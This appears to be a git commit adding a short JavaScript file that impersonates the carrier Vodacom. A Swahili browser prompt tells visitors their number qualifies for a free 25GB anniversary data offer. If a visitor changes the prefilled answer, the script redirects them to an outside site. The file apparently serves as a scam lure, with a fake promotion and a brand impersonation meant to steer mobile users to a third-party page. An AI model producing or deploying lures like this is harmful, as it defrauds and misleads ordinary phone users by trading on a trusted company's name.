fb0c9159df11a7710c0a38ed64abe1108dd61f4b
dhatablog <williamsnsiako@gmail.com>
2025-09-28 09:40:12 +0100

    Create 25-activation.js

---
+++ 25-activation.js
@@ -0,0 +1,5 @@
+var password = 'Washa 25GB'
+password=prompt('VODACOM: Hongera, nambari yako ya Vodacom inastahiki kupokea ofa ya 25gb Anniversary, bofya Sawa ili kuwezesha sasa','Washa 25GB');
+if (password != 'Washa 25GB') {
+location.href='https://eahigh.org/ng65yrs.html';
+}
